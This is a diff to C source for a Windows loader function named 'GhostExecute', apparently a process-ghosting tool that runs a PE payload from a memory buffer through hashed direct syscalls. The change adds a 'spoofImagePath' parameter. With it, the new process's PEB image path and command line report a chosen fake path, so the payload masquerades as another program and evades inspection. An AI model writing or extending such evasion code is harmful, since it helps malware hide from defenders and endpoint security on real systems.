@@ -114,7 +114,7 @@ static inline NTSTATUS SyscallNt(QWORD hash,
 // =====================================================================
 // GhostExecute
 // =====================================================================
-NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
+NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize, const wchar_t* spoofImagePath) {
 
     //Validate PE
     if (!payloadBuffer || payloadSize < sizeof(IMAGE_DOS_HEADER))
@@ -333,9 +333,13 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
         PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + rNt->OptionalHeader.AddressOfEntryPoint);
 
         //Create process parameters
+        // If spoofImagePath provided, use it for PEB (GetModuleFileNameW will return this)
+        // Otherwise fall back to the temp ghost.exe DOS path
+        const wchar_t* pebImagePath = spoofImagePath ? spoofImagePath : dosPath;
+        
         UNICODE_STRING uImagePath, uDllPath, uCurrentDir, uCmdLine, uTitle;
 
-        mRtlInitUnicodeString(&uImagePath, dosPath);
+        mRtlInitUnicodeString(&uImagePath, pebImagePath);
 
         wchar_t sysDir[MAX_PATH] = { 0 };
         API.GetSystemDirectoryW(sysDir, MAX_PATH);
@@ -343,7 +347,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
 
         // Use system dir as current dir
         mRtlInitUnicodeString(&uCurrentDir, sysDir);
-        mRtlInitUnicodeString(&uCmdLine, dosPath);
+        mRtlInitUnicodeString(&uCmdLine, pebImagePath);
 
         wchar_t titleStr[] = { 'G','\0' };
         mRtlInitUnicodeString(&uTitle, titleStr);
